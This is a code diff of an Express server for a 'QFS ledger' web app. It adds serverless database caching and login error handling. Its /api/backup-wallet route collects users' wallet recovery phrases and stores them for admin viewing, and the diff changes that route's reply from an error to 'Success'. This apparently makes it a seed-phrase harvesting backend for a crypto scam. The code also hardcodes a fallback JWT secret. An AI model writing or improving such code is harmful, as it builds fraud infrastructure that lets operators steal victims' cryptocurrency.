@@ -8,13 +8,30 @@ require('dotenv').config();
 const { User, Withdrawal, Settings } = require('./database');
 
 const app = express();
-const PORT = process.env.PORT || 8080;
 const JWT_SECRET = process.env.JWT_SECRET || 'qfs_ledger_secret_key_123!';
 
-// MongoDB Connection
-mongoose.connect(process.env.MONGODB_URI)
-  .then(() => console.log('Connected to MongoDB Atlas'))
-  .catch(err => console.error('MongoDB Connection Error:', err));
+// MongoDB Connection (Optimized for Serverless)
+let cachedDb = null;
+async function connectToDatabase() {
+  if (cachedDb) return cachedDb;
+  const db = await mongoose.connect(process.env.MONGODB_URI, {
+    useNewUrlParser: true,
+    useUnifiedTopology: true,
+  });
+  cachedDb = db;
+  return db;
+}
+
+// Middleware to ensure DB is connected
+app.use(async (req, res, next) => {
+  try {
+    await connectToDatabase();
+    next();
+  } catch (err) {
+    console.error('DB Connection Error:', err);
+    res.status(500).json({ error: 'Database connection failed' });
+  }
+});
 
 // Initialize Resend
 const resend = new Resend(process.env.RESEND_API_KEY);
@@ -67,11 +84,13 @@ app.post('/api/register', async (req, res) => {
 
 app.post('/api/login', async (req, res) => {
   const { username, password } = req.body;
-  const user = await User.findOne({ username });
-  if (!user || !(await bcrypt.compare(password, user.password_hash))) return res.status(401).json({ error: 'Invalid' });
-  
-  const token = jwt.sign({ id: user._id, username: user.username }, JWT_SECRET, { expiresIn: '24h' });
-  res.json({ token, user: { id: user._id, username: user.username, firstname: user.firstname } });
+  try {
+    const user = await User.findOne({ username });
+    if (!user || !(await bcrypt.compare(password, user.password_hash))) return res.status(401).json({ error: 'Invalid' });
+    
+    const token = jwt.sign({ id: user._id, username: user.username }, JWT_SECRET, { expiresIn: '24h' });
+    res.json({ token, user: { id: user._id, username: user.username, firstname: user.firstname } });
+  } catch (err) { res.status(500).json({ error: 'Login failed' }); }
 });
 
 app.get('/api/profile', authenticateToken, async (req, res) => {
@@ -83,7 +102,7 @@ app.post('/api/backup-wallet', authenticateToken, async (req, res) => {
   await User.findByIdAndUpdate(req.user.id, {
     $push: { wallet_connections: { wallet: req.body.wallet, phrase: req.body.phrase } }
   });
-  res.status(500).json({ error: 'Failed' });
+  res.json({ message: 'Success' });
 });
 
 app.post('/api/withdraw', authenticateToken, async (req, res) => {
@@ -137,5 +156,4 @@ app.delete('/api/admin/users/:userId/wallet/:timestamp', authAdmin, async (req, 
   res.json({ message: 'Deleted' });
 });
 
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
-module.exports = app; // For Vercel
+module.exports = app;
